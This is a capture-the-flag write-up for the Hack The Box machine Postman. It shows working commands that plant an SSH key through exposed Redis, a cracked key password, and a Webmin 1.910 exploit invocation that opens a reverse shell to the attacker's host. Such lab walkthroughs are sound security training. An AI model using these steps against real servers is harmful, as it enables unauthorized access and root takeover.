---
title: "Hack The Box - Postman"
tags: [linux,easy,redis , webmin , ssh key , john , Matt , webmin 1.910]
categories: HackTheBox-Linux
---

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Postman%20Box%207bd639e86f7540b19860e8f7252bec9b/Untitled.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Postman%20Box%207bd639e86f7540b19860e8f7252bec9b/Untitled.png)

## NMAP

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Postman%20Box%207bd639e86f7540b19860e8f7252bec9b/Untitled%201.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Postman%20Box%207bd639e86f7540b19860e8f7252bec9b/Untitled%201.png)

⇒ We found an exploit for webmin but its authenticated. We couldnt login using defualt credentials.

Authenticated Exploit : [https://github.com/roughiz/Webmin-1.910-Exploit-Script](https://github.com/roughiz/Webmin-1.910-Exploit-Script)

### Exploiting REDIS

[https://book.hacktricks.xyz/pentesting/6379-pentesting-redis](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Postman%20Box%207bd639e86f7540b19860e8f7252bec9b/Untitled%202.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Postman%20Box%207bd639e86f7540b19860e8f7252bec9b/Untitled%202.png)

→ So looks like we are able to write our public key to redis user authorized_keys.

1) Writing public key to a file

**(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt**

2) Importing file into redis

**cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit**

3) Saving the public key to authorized_keys

**config set dir ./.ssh**

**config set dbfilename "authorized_keys"**

**save**

→ SSH'ed in as redis user :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Postman%20Box%207bd639e86f7540b19860e8f7252bec9b/Untitled%203.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Postman%20Box%207bd639e86f7540b19860e8f7252bec9b/Untitled%203.png)

## Privilege Escalation to User

⇒ We found an backup ssh key in /opt folder :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Postman%20Box%207bd639e86f7540b19860e8f7252bec9b/Untitled%204.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Postman%20Box%207bd639e86f7540b19860e8f7252bec9b/Untitled%204.png)

→ Cracked the key password using john :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Postman%20Box%207bd639e86f7540b19860e8f7252bec9b/Untitled%205.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Postman%20Box%207bd639e86f7540b19860e8f7252bec9b/Untitled%205.png)

Password : **computer2008**

→ We were not able to ssh in as user Matt or root using the ssh key. We were able to switch to Matt user using the key password :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Postman%20Box%207bd639e86f7540b19860e8f7252bec9b/Untitled%206.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Postman%20Box%207bd639e86f7540b19860e8f7252bec9b/Untitled%206.png)

## Privilege Escalation to Root

⇒ We were able to login on webmin using Matt user password. By default webmin runs as root so we can exploit this to get shell as root

Exploit : [https://github.com/roughiz/Webmin-1.910-Exploit-Script](https://github.com/roughiz/Webmin-1.910-Exploit-Script)

**python webmin_exploit.py --rhost 10.10.10.160 --lhost 10.10.14.4 -p computer2008 -u Matt -s True --lport 9001**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Postman%20Box%207bd639e86f7540b19860e8f7252bec9b/Untitled%207.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Postman%20Box%207bd639e86f7540b19860e8f7252bec9b/Untitled%207.png)

